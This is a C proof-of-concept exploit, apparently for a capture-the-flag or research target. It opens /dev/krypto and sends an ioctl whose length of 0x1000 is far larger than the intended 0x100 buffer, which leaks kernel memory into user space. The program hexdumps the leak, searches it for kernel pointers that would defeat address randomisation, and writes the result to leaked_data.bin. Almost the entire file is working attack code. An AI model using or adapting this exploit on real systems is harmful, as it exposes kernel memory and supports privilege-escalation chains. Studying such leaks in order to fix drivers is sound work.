#include <sys/ioctl.h>
#include <sys/mman.h>

#define KRYPTO_RNG_GET 0xC018DEB7
#define BUFFER_SIZE 0x100
#define OVERFLOW_SIZE 0x1000

struct krypto_params {
    void *buf;
    size_t buf_len;
};

void hexdump(void *ptr, int buflen) {
    unsigned char *buf = (unsigned char*)ptr;
    for (int i = 0; i < buflen; i += 16) {
        printf("%06x: ", i);
        for (int j = 0; j < 16; j++) {
            if (i+j < buflen)
                printf("%02x ", buf[i+j]);
            else
                printf("   ");
        }
        printf(" ");
        for (int j = 0; j < 16; j++) {
            if (i+j < buflen) {
                if (buf[i+j] >= 32 && buf[i+j] <= 126)
                    printf("%c", buf[i+j]);
                else
                    printf(".");
            }
        }
        printf("\n");
    }
}

int is_kernel_pointer(unsigned long addr) {
    // Check if address is in kernel space (usually above 0xffff800000000000)
    return addr >= 0xffff800000000000UL;
}

int main() {
    int fd = open("/dev/krypto", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Allocate a buffer that will receive the data
    void *buf = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, 
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    struct krypto_params params = {
        .buf = buf,
        .buf_len = OVERFLOW_SIZE
    };

    // Print memory contents before ioctl
    printf("Memory contents before ioctl:\n");
    hexdump(buf, BUFFER_SIZE);

    // Perform the ioctl call
    if (ioctl(fd, KRYPTO_RNG_GET, &params) < 0) {
        perror("ioctl");
        munmap(buf, 0x2000);
        close(fd);
        return 1;
    }

    // Print memory contents after ioctl
    printf("\nMemory contents after ioctl:\n");
    hexdump(buf, OVERFLOW_SIZE);

    // Check for kernel pointers
    unsigned long *ptr = (unsigned long *)buf;
    int found_kernel_ptr = 0;
    for (size_t i = 0; i < OVERFLOW_SIZE/sizeof(unsigned long); i++) {
        if (is_kernel_pointer(ptr[i])) {
            printf("\nFound kernel pointer at offset 0x%lx: 0x%lx\n", 
                   i * sizeof(unsigned long), ptr[i]);
            found_kernel_ptr = 1;
        }
    }

    // Save leaked data to file
    FILE *f = fopen("leaked_data.bin", "wb");
    if (f) {
        fwrite(buf, 1, OVERFLOW_SIZE, f);
        fclose(f);
        printf("\nLeaked data saved to leaked_data.bin\n");
    }

    munmap(buf, 0x2000);
    close(fd);
    return 0;
}

